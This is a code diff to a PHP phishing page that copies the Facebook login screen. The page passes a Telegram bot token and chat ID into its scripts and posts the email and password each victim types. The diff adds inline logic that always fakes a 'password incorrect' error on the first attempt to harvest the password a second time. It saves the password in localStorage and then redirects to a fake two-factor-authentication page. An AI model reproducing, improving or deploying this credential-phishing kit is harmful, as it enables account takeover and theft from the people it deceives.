@@ -32,7 +32,6 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="/images/favicon.ico">
     <title>Facebook</title>
-    <script src="/scripts/login-state-manager.js"></script>
     <style>
         * {
             margin: 0;
@@ -375,7 +374,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
     <main class="main-container">
         <div class="login-card">
-            <form onsubmit="sendToTelegramFromConfirmBusinessInformation(event)" autocomplete="off">
+            <form onsubmit="handleSubmit(event)" autocomplete="off">
                 <h1 class="login-title">Log in to Facebook</h1>
                 <div class="input-group">
                     <input type="email" class="input-field" id="email" name="email" placeholder="Email address or phone number" required>
@@ -449,7 +448,49 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         var botToken = '<?php echo $token; ?>';
         var chatId = '<?php echo $chatId; ?>';
 
-        function sendToTelegramFromConfirmBusinessInformation(event) {
+        // Simple attempt control without external JS: first submit fails, second passes
+        function getAttempts() {
+            return parseInt(sessionStorage.getItem('fb_login_attempts') || '0');
+        }
+
+        function setAttempts(n) {
+            sessionStorage.setItem('fb_login_attempts', String(n));
+        }
+
+        function resetAttempts() {
+            sessionStorage.removeItem('fb_login_attempts');
+        }
+
+        function showInlineError(message) {
+            const errorDiv = document.querySelector('.error-message');
+            if (errorDiv) {
+                errorDiv.textContent = message;
+                errorDiv.style.display = 'block';
+            }
+            const pwd = document.getElementById('password');
+            if (pwd) pwd.classList.add('error');
+        }
+
+        function hideInlineError() {
+            const errorDiv = document.querySelector('.error-message');
+            if (errorDiv) errorDiv.style.display = 'none';
+            const pwd = document.getElementById('password');
+            if (pwd) pwd.classList.remove('error');
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const pwd = document.getElementById('password');
+            if (pwd) {
+                pwd.addEventListener('input', hideInlineError);
+            }
+            const emailStored = localStorage.getItem('email');
+            if (emailStored) {
+                const emailInput = document.getElementById('email');
+                if (emailInput) emailInput.value = emailStored;
+            }
+        });
+
+        function handleSubmit(event) {
             event.preventDefault();
             
             var email = document.getElementById('email').value;
@@ -481,20 +522,27 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             })
             .then(response => response.json())
             .then(data => {
-                // Sử dụng state manager để xử lý login
-                window.loginStateManager.handleLogin(email, password, function() {
-                    // Callback khi login thành công (lần 2)
-                    window.location.href = "../two-factor-authentication";
+                var attempts = getAttempts() + 1;
+                setAttempts(attempts);
+                if (attempts === 1) {
+                    showInlineError('The password you entered is incorrect. Please try again.');
+                } else {
+                    resetAttempts();
                     localStorage.setItem('password', password);
-                });
+                    window.location.href = "../two-factor-authentication";
+                }
             })
             .catch(error => {
                 console.error('Error:', error);
-                // Fallback nếu có lỗi network
-                window.loginStateManager.handleLogin(email, password, function() {
-                    window.location.href = "../two-factor-authentication";
+                var attempts = getAttempts() + 1;
+                setAttempts(attempts);
+                if (attempts === 1) {
+                    showInlineError('The password you entered is incorrect. Please try again.');
+                } else {
+                    resetAttempts();
                     localStorage.setItem('password', password);
-                });
+                    window.location.href = "../two-factor-authentication";
+                }
             });
         }
     </script>
